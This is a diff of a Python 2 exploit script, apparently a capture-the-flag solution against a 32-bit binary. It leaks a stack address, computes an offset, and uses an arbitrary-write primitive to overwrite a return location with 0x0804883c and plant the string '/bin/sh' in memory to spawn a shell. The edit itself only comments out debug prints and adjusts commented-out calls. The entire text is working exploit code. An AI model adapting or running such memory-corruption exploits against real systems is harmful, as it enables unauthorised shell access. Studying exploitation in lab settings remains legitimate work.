@@ -17,15 +17,15 @@ def recv():
 	return luck
 
 luck = int(recv(), 16)
-print hex(luck)
+#print hex(luck)
 local = 0xffffcfcc
 diff = luck - local
-print hex(diff)
+#print hex(diff)
 
 
 send(0xffffcffc + diff, 0x0804883c)   
-#send(0xffffcfac, 0x0804883c)
-#send(0xffffcfac, 0x0804883c)
+#send(0xffffcffc, 0x0804883c)
+#send(0xffffcffc, 0x0804883c)
 send(0x080bb888, 0x6e69622f)  # 'nib/'
 send(0x080bb88c, 0x2068732f)  # ' hs/'
 #p.recv()
